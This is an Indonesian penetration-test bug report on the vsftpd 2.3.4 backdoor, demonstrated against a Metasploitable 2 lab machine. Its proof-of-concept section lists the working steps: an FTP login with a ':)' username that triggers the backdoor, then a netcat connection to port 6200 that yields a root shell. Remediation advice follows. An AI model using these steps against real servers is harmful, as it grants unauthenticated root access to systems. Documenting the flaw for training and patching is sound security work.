---
title: 🐞 Bug Report – Backdoor pada FTP Service (vsftpd 2.3.4)
updated: 2025-12-17 03:56:40Z
created: 2025-12-17 03:55:40Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

# 🐞 Bug Report – Backdoor pada FTP Service (vsftpd 2.3.4)

## 1\. Informasi Umum

- **Judul**: Backdoor Command Execution pada FTP Service vsftpd 2.3.4
    
- **Severity**: **Critical**
    
- **Kategori**: Network Service Exploitation
    
- **OWASP Mapping**: A05 – Security Misconfiguration
    
- **CWE**: CWE-78 – OS Command Injection
    
- **Status**: Open
    
- **Tanggal Temuan**: \[isi tanggal\]
    
- **Tester**: \[Nama Tester\]
    

* * *

## 2\. Deskripsi Kerentanan

Sistem target **Metasploitable 2** menggunakan **vsftpd versi 2.3.4** pada port **21/TCP**, yang diketahui memiliki **backdoor bawaan**.  
Backdoor ini memungkinkan penyerang **mendapatkan akses shell tanpa autentikasi** dengan mengirimkan username khusus saat proses login FTP.

Kerentanan ini memungkinkan **remote command execution (RCE)** dan memberikan **akses penuh ke sistem target**.

* * *

## 3\. Dampak (Impact)

Eksploitasi kerentanan ini memungkinkan penyerang untuk:

- Mendapatkan **shell akses** ke server
    
- Menjalankan perintah sistem
    
- Melakukan privilege escalation
    
- Mengambil alih server sepenuhnya
    

⚠️ **Tingkat risiko: Critical**, karena tidak memerlukan kredensial dan dapat dieksploitasi secara remote.

* * *

## 4\. Sistem Terdampak

- **Host**: 192.168.56.101
    
- **Port**: 21/TCP
    
- **Service**: FTP
    
- **Software**: vsftpd 2.3.4
    
- **OS**: Linux (Metasploitable 2)
    

* * *

## 5\. Bukti Kerentanan (Proof of Concept)

### 5.1 Hasil Enumerasi Service

`nmap -sV -p 21 192.168.56.101`

**Output:**

`21/tcp open ftp vsftpd 2.3.4`

* * *

### 5.2 Eksploitasi Manual (Backdoor Trigger)

Login FTP dengan username yang mengandung karakter `:)`

`ftp 192.168.56.101`

`Name: backdoor:)Password: anything`

➡ Server membuka backdoor shell di port **6200**

* * *

### 5.3 Mendapatkan Shell

`nc 192.168.56.101 6200`

**Hasil:**

`iduid=0(root) gid=0(root)`

📌 Akses shell **root berhasil diperoleh**

* * *

## 6\. Expected vs Actual Result

| Expected Result | Actual Result |
| --- | --- |
| FTP meminta autentikasi valid | Backdoor aktif |
| Akses dibatasi user FTP | Shell root terbuka |
| Tidak ada RCE | Remote Command Execution |

* * *

## 7\. Root Cause Analysis

- Penggunaan **vsftpd 2.3.4 versi rentan**
    
- Backdoor hardcoded pada service
    
- Tidak dilakukan patching / update
    
- Service FTP diekspos ke jaringan
    

* * *

## 8\. Rekomendasi Perbaikan

Disarankan untuk:

1.  **Segera mengganti vsftpd 2.3.4**
    
2.  Update FTP server ke versi terbaru
    
3.  Batasi akses FTP menggunakan firewall
    
4.  Gunakan **SFTP (SSH)** sebagai alternatif
    
5.  Lakukan **service hardening & patch management**
    
6.  Monitoring port tidak dikenal (6200)
    

* * *

## 9\. Referensi

- Exploit Database – vsftpd 2.3.4 Backdoor
    
- CVE-2011-2523
    
- OWASP Testing Guide – Network Services
    

* * *

## 10\. Kesimpulan

Kerentanan pada FTP service vsftpd 2.3.4 di Metasploitable 2 memungkinkan penyerang mendapatkan akses root tanpa autentikasi. Kerentanan ini bersifat **kritis** dan menunjukkan pentingnya **patch management dan service hardening** pada sistem produksi.